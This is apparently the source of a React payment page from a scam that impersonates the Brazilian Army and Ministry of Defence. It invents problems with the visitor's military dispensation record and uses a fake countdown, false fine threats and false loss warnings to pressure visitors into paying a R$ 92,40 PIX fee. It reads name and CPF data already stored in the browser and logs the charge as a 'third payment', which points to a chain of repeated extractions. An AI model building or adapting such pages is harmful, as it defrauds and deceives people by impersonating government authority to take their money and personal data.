import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { AlertTriangle, Clock, CreditCard, Shield, CheckCircle, Copy, X, ArrowRight, FileCheck, Database, Zap } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { useToast } from '@/hooks/use-toast';

export default function RegularizacaoPagamentoPage() {
  const [, setLocation] = useLocation();
  const [candidateFirstName, setCandidateFirstName] = useState('');
  const [candidateFullName, setCandidateFullName] = useState('');
  const [candidateCPF, setCandidateCPF] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [timeLeft, setTimeLeft] = useState(1200); // 20 minutes
  const [isGeneratingPix, setIsGeneratingPix] = useState(false);
  const [showPixModal, setShowPixModal] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [isCopied, setIsCopied] = useState(false);
  const [currentAlert, setCurrentAlert] = useState(0);
  const [isPaymentConfirmed, setIsPaymentConfirmed] = useState(false);
  const [isMonitoringPayment, setIsMonitoringPayment] = useState(false);
  const paymentCheckInterval = useRef<NodeJS.Timeout | null>(null);
  const { trackEvent } = useClarityEvents();
  const { toast } = useToast();

  // Gender helper functions
  const isFemale = candidateGender === 'f' || candidateGender === 'F' || candidateGender === 'feminino' || candidateGender === 'female';
  
  const getGenderedText = (masculine: string, feminine: string) => {
    return isFemale ? feminine : masculine;
  };

  const urgencyAlerts = [
    "⚠️ 30 candidatos perderam a oportunidade nas últimas 2 horas",
    "🔥 Sistema SUD será desativado em 30 dias - sem prorrogação",
    "⏰ Prazo para regularização expira hoje às 23:59h",
    "💰 Evite multa de R$ 350,00 + juros da Receita Federal"
  ];

  const pixIcon = (
    <svg 
      className="w-8 h-8"
      viewBox="0 0 24 24" 
      fill="currentColor"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M7.4 2.4L5.6 4.2l4.2 4.2 4.2-4.2-1.8-1.8L12 2.6 7.4 2.4zM2.4 7.4l1.8 1.8L8.4 5L6.6 3.2 2.4 7.4zM16.6 2.4L14.8 4.2l4.2 4.2 1.8-1.8L16.6 2.4zM21.6 7.4L19.8 9.2l-4.2-4.2 1.8-1.8L21.6 7.4zM7.4 16.6l1.8 1.8 4.2-4.2-1.8-1.8L7.4 16.6zM2.4 16.6l4.2 4.2 1.8-1.8-4.2-4.2L2.4 16.6zM16.6 21.6l1.8-1.8-4.2-4.2-1.8 1.8L16.6 21.6zM21.6 16.6l-4.2 4.2-1.8-1.8 4.2-4.2L21.6 16.6z"/>
    </svg>
  );

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Load user data
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        const fullName = parsedData.name || parsedData.nomeCompleto || '';
        const gender = parsedData.gender || parsedData.genero ||parsedData.sexo || '';
        setCandidateFullName(fullName);
        setCandidateCPF(parsedData.cpf || '');
        setCandidateGender(gender.toLowerCase());
        
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateFirstName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
      } catch (error) {
        console.error('Error loading user data:', error);
      }
    }

    // Track page entry
    trackEvent('final_payment_page_entered', {
      page: 'regularizacao_pagamento',
      candidate_name: candidateFirstName,
      timestamp: new Date().toISOString()
    });

    // Rotate urgency alerts
    const alertInterval = setInterval(() => {
      setCurrentAlert((prev) => (prev + 1) % urgencyAlerts.length);
    }, 3000);

    return () => clearInterval(alertInterval);
  }, []);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Payment monitoring function
  const startPaymentMonitoring = (transactionId: string) => {
    setIsMonitoringPayment(true);
    
    // Clear any existing interval
    if (paymentCheckInterval.current) {
      clearInterval(paymentCheckInterval.current);
    }
    
    // Start checking payment status every 1 second
    paymentCheckInterval.current = setInterval(async () => {
      try {
        const response = await fetch(`/api/verificar-status-pagamento/${transactionId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json'
          }
        });
        
        const result = await response.json();
        
        if (result.success && (result.data?.status === 'PAID' || result.data?.status === 'APPROVED')) {
          // Payment confirmed!
          setIsPaymentConfirmed(true);
          setIsMonitoringPayment(false);
          
          // Clear the interval
          if (paymentCheckInterval.current) {
            clearInterval(paymentCheckInterval.current);
          }
          
          // Track payment confirmation
          trackEvent('third_payment_confirmed', {
            transaction_id: transactionId,
            amount: '92.40',
            candidate_name: candidateFullName,
            timestamp: new Date().toISOString()
          });
          
          // Close modal and show success message
          setShowPixModal(false);
          toast({
            title: "Pagamento Confirmado!",
            description: "Redirecionando para página de confirmação...",
          });
          
          // Redirect to thank you page after 2 seconds
          setTimeout(() => {
            setLocation('/obrigado');
          }, 2000);
        }
      } catch (error) {
        console.error('Error checking payment status:', error);
      }
    }, 1000); // Check every 1 second
  };

  // Cleanup interval on component unmount
  useEffect(() => {
    return () => {
      if (paymentCheckInterval.current) {
        clearInterval(paymentCheckInterval.current);
      }
    };
  }, []);

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const handleGeneratePix = async () => {
    setIsGeneratingPix(true);
    
    trackEvent('third_payment_initiated', {
      candidate_name: candidateFullName,
      candidate_cpf: candidateCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.***.***-$4'),
      amount: '92.40',
      page: 'regularizacao_pagamento',
      timestamp: new Date().toISOString()
    });

    try {
      const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
      let parsedUserData: any = {};
      
      if (userData) {
        parsedUserData = JSON.parse(userData);
      }

      const pixPayload = {
        nome: candidateFullName,
        cpf: candidateCPF.replace(/\D/g, ''),
        email: parsedUserData?.email || 'candidato@exemplo.com',
        telefone: parsedUserData?.phone || localStorage.getItem('phoneuser') || '11999999999',
        valor: 9240, // R$ 92,40 em centavos
        applicationData: parsedUserData,
        inscricaoData: {
          vaga: {
            id: 'regularizacao-migracao',
            title: 'Mentoria Avançada + Analise de Editais Locais',
            company: 'Ministério da Defesa',
            location: `${parsedUserData?.cidade || 'Cidade'} - ${parsedUserData?.uf || 'UF'}`,
            area: 'Regularização Cadastral',
            carga_horaria: 'Processamento Imediato',
            requirements: 'Identidade verificada'
          },
          localProva: {
            name: 'Regularização Digital',
            address: 'Sistema SUD 2025',
            type: 'processamento_online',
            distance: null
          },
          dataProva: new Date().toISOString().split('T')[0],
          horaProva: new Date().toTimeString().split(' ')[0].substring(0, 5)
        },
        userData: parsedUserData,
        pessoalData: {
          tipo_regularizacao: 'certificado_dispensa_migracao_sud',
          urgencia: 'maxima',
          validacao_identidade: 'aprovada'
        }
      };

      const response = await fetch('/api/gerar-pix', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(pixPayload)
      });

      const result = await response.json();

      if (result.success) {
        const pixTransaction = {
          id: result.data.id,
          qrCode: result.data.qrCode,
          pixCode: result.data.pixCode,
          amount: result.data.amount,
          status: result.data.status,
          createdAt: result.data.createdAt
        };
        
        localStorage.setItem('thirdPixTransaction', JSON.stringify(pixTransaction));
        localStorage.setItem('thirdPaymentAmount', '92.40');
        localStorage.setItem('thirdPaymentDate', new Date().toISOString());
        
        setPixData(pixTransaction);
        setShowPixModal(true);
        
        // Start payment monitoring
        startPaymentMonitoring(result.data.id);
      } else {
        console.error('Error generating PIX:', result.error);
        toast({
          title: "Erro ao gerar PIX",
          description: "Tente novamente em alguns instantes.",
          variant: "destructive"
        });
      }
    } catch (error) {
      console.error('Error during PIX generation:', error);
      toast({
        title: "Erro interno",
        description: "Tente novamente em alguns instantes.",
        variant: "destructive"
      });
    } finally {
      setIsGeneratingPix(false);
    }
  };

  const handleCopyPixCode = async () => {
    if (pixData?.pixCode) {
      try {
        await navigator.clipboard.writeText(pixData.pixCode);
        setIsCopied(true);
        toast({
          title: "Código PIX copiado!",
          description: "Cole no seu aplicativo bancário para efetuar o pagamento."
        });
        setTimeout(() => setIsCopied(false), 3000);
      } catch (error) {
        console.error('Error copying to clipboard:', error);
        toast({
          title: "Erro ao copiar",
          description: "Tente copiar manualmente o código PIX.",
          variant: "destructive"
        });
      }
    }
  };

  const handleCloseModal = () => {
    // Stop payment monitoring when modal is closed
    if (paymentCheckInterval.current) {
      clearInterval(paymentCheckInterval.current);
    }
    setIsMonitoringPayment(false);
    setShowPixModal(false);
    setLocation('/agendamento-medico');
  };

  return (
    <div className="min-h-screen bg-gray-50" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-8">
        {/* Breadcrumb */}
        <nav className="text-sm text-gray-600 mb-6">
          <span className="text-gray-400">Alistamento Temporário</span>
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-400">Regularização</span>
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Pagamento</span>
        </nav>

        {/* Status Alert */}
        <div className="bg-gradient-to-r from-orange-50 to-yellow-50 border border-orange-200 rounded-lg p-4 mb-8">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <Clock className="w-5 h-5 text-orange-600 mr-3" />
              <div>
                <p className="text-sm font-medium text-orange-800">Prazo para conclusão</p>
                <p className="text-xs text-orange-600">Processo deve ser finalizado em breve</p>
              </div>
            </div>
            <div className="text-right">
              <div className="text-lg font-bold text-orange-700">
                {formatTime(timeLeft)}
              </div>
            </div>
          </div>
        </div>

        {/* Header */}
        <div className="bg-white rounded-lg shadow-sm border p-8 mb-8">
          <header className="mb-6">
            <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
              Finalização da Regularização
            </h1>
            
            <div className="flex items-center text-xs text-gray-600 mb-6 pb-4 border-b border-gray-200">
              <time dateTime="2025-06-15">
                <span className="font-medium">Processamento:</span> 15/06/2025 às {new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}
              </time>
              <span className="mx-2 text-gray-400">|</span>
              <span className="font-medium">Sistema:</span> Pagamentos SUD 2025
            </div>

            <p className="text-lg text-gray-700 leading-relaxed">
              <strong>{candidateFirstName}</strong>, você está na etapa final do processo de regularização. 
              Esta taxa única resolve ambos os problemas identificados no seu cadastro militar.
            </p>
          </header>

          {/* Problem Summary */}
          <div className="bg-gray-50 rounded-lg p-6 mb-6">
            <h2 className="text-lg font-semibold text-gray-900 mb-4">Situações a serem regularizadas</h2>
            <div className="space-y-3">
              <div className="flex items-start">
                <div className="w-6 h-6 bg-red-100 rounded-full flex items-center justify-center mr-3 mt-0.5">
                  <span className="text-red-600 text-xs font-bold">1</span>
                </div>
                <div>
                  <p className="font-medium text-gray-900">Certificado de Dispensa Irregular</p>
                  <p className="text-sm text-gray-600">Status incompatível com protocolo 2025, gerando risco de bloqueio no CPF</p>
                </div>
              </div>
              <div className="flex items-start">
                <div className="w-6 h-6 bg-red-100 rounded-full flex items-center justify-center mr-3 mt-0.5">
                  <span className="text-red-600 text-xs font-bold">2</span>
                </div>
                <div>
                  <p className="font-medium text-gray-900">Dados não migrados para SUD 2025</p>
                  <p className="text-sm text-gray-600">Sistema antigo será desativado, causando perda dos R$ 225,09 investidos</p>
                </div>
              </div>
            </div>
          </div>

          {/* Service Details */}
          <div className="border-l-4 border-green-500 bg-green-50 p-6 mb-6">
            <h2 className="text-lg font-semibold text-green-800 mb-4">Solução Combinada Incluída</h2>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <div className="flex items-center text-sm text-green-700">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  <span>Regularização imediata do certificado</span>
                </div>
                <div className="flex items-center text-sm text-green-700">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  <span>Migração completa para SUD 2025</span>
                </div>
                <div className="flex items-center text-sm text-green-700">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  <span>Processamento em 5 minutos</span>
                </div>
              </div>
              <div className="space-y-2">
                <div className="flex items-center text-sm text-green-700">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  <span>Proteção contra multas (R$ 350+)</span>
                </div>
                <div className="flex items-center text-sm text-green-700">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  <span>Preserva investimento de R$ 225,09</span>
                </div>
                <div className="flex items-center text-sm text-green-700">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  <span>Certificação digital permanente</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Section */}
        <div className="bg-white rounded-lg shadow-sm border p-8 mb-8">
          <h2 className="text-xl font-bold text-gray-900 mb-6">Detalhamento da Taxa</h2>
          
          <div className="space-y-3 mb-6">
            <div className="flex justify-between items-center py-3 border-b border-gray-100">
              <span className="text-gray-700">Regularização do certificado de dispensa</span>
              <span className="font-medium text-gray-900">R$ 42,80</span>
            </div>
            <div className="flex justify-between items-center py-3 border-b border-gray-100">
              <span className="text-gray-700">Migração de dados para SUD 2025</span>
              <span className="font-medium text-gray-900">R$ 31,20</span>
            </div>
            <div className="flex justify-between items-center py-3 border-b border-gray-100">
              <span className="text-gray-700">Processamento prioritário</span>
              <span className="font-medium text-gray-900">R$ 18,40</span>
            </div>
            <div className="flex justify-between items-center py-4 bg-green-50 rounded-lg px-4 border border-green-200">
              <span className="text-lg font-bold text-gray-900">Valor Total</span>
              <span className="text-2xl font-bold text-green-600">R$ 92,40</span>
            </div>
          </div>

          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-start">
              <Shield className="w-5 h-5 text-blue-600 mr-3 mt-0.5" />
              <div>
                <p className="text-sm font-medium text-blue-800">Pagamento Seguro</p>
                <p className="text-xs text-blue-600">Processado via PIX através de sistema bancário homologado pelo Banco Central</p>
              </div>
            </div>
          </div>

          <div className="text-center">
            <button 
              onClick={handleGeneratePix}
              disabled={isGeneratingPix}
              className={`
                relative overflow-hidden group
                bg-gray-900 hover:bg-gray-800 
                text-white font-medium
                px-10 py-4 rounded-lg
                transition-all duration-300 ease-out
                border border-transparent hover:border-gray-700
                shadow-md hover:shadow-lg
                ${isGeneratingPix ? 'cursor-not-allowed opacity-75' : 'cursor-pointer'}
              `}
            >
              <div className="flex items-center justify-center space-x-3">
                {isGeneratingPix ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Processando...</span>
                  </>
                ) : (
                  <>
                    <CreditCard className="w-4 h-4" />
                    <span>Gerar Guia de Pagamento</span>
                  </>
                )}
              </div>
              
              {/* Subtle hover effect */}
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700"></div>
            </button>
            
            <p className="text-xs text-gray-500 mt-4 font-medium">
              Processamento seguro via PIX • Confirmação instantânea
            </p>
          </div>
        </div>

        {/* PIX Modal */}
        <Dialog open={showPixModal} onOpenChange={() => {}}>
          <DialogContent className="max-w-lg border-0 shadow-2xl bg-white rounded-2xl p-0 overflow-hidden">
            {/* Header */}
            <div className="bg-gradient-to-r from-gray-50 to-gray-100 px-6 py-4 border-b border-gray-100">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-5 h-5 text-green-600" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-900">Guia de Pagamento</h3>
                    <p className="text-sm text-gray-500">PIX gerado com sucesso</p>
                  </div>
                </div>
                <button
                  onClick={() => setShowPixModal(false)}
                  className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition-colors"
                >
                  <X className="w-4 h-4 text-gray-600" />
                </button>
              </div>
            </div>

            <div className="p-6 space-y-6">
              {/* Amount */}
              <div className="text-center">
                <p className="text-sm text-gray-600 mb-1">Valor a pagar</p>
                <p className="text-3xl font-bold text-gray-900">R$ 92,40</p>
              </div>

              {/* QR Code */}
              {pixData?.qrCode && (
                <div className="flex justify-center">
                  <div className="bg-white p-4 rounded-xl border-2 border-gray-100 shadow-sm">
                    <img 
                      src={pixData.qrCode} 
                      alt="QR Code PIX" 
                      className="w-48 h-48 object-contain"
                    />
                  </div>
                </div>
              )}

              {/* Instructions */}
              <div className="bg-blue-50 rounded-xl p-4 space-y-2">
                <h4 className="font-medium text-blue-900 text-sm">Como pagar:</h4>
                <div className="space-y-1 text-xs text-blue-800">
                  <p>1. Abra o app do seu banco</p>
                  <p>2. Escaneie o QR Code ou copie o código</p>
                  <p>3. Confirme o pagamento</p>
                </div>
              </div>

              {/* PIX Code */}
              <div className="space-y-2">
                <p className="text-sm font-medium text-gray-700">Código PIX Copia e Cola</p>
                <div className="flex items-center space-x-2">
                  <input
                    type="text"
                    value={pixData?.pixCode || ''}
                    readOnly
                    className="flex-1 text-xs px-3 py-2 bg-gray-50 border border-gray-200 rounded-lg font-mono text-gray-700 focus:outline-none"
                  />
                  <button
                    onClick={handleCopyPixCode}
                    className={`
                      px-4 py-2 rounded-lg font-medium text-sm transition-all
                      ${isCopied 
                        ? 'bg-green-100 text-green-700 border border-green-200' 
                        : 'bg-gray-100 hover:bg-gray-200 text-gray-700 border border-gray-200'
                      }
                    `}
                  >
                    {isCopied ? (
                      <div className="flex items-center space-x-1">
                        <CheckCircle className="w-4 h-4" />
                        <span>Copiado</span>
                      </div>
                    ) : (
                      <div className="flex items-center space-x-1">
                        <Copy className="w-4 h-4" />
                        <span>Copiar</span>
                      </div>
                    )}
                  </button>
                </div>
              </div>

              {/* Payment Monitoring Status */}
              {isMonitoringPayment && (
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                    <div>
                      <p className="text-sm font-medium text-blue-900">Aguardando pagamento...</p>
                      <p className="text-xs text-blue-700">Verificando status automaticamente</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Footer Note */}
              <div className="bg-gray-50 rounded-lg p-3 text-center">
                <p className="text-xs text-gray-600">
                  {isMonitoringPayment 
                    ? "Assim que o pagamento for confirmado, você será redirecionado automaticamente."
                    : "Após o pagamento, o processamento será automático e você receberá a confirmação em instantes."
                  }
                </p>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </main>
      
      <ExercitoFooter />
    </div>
  );
}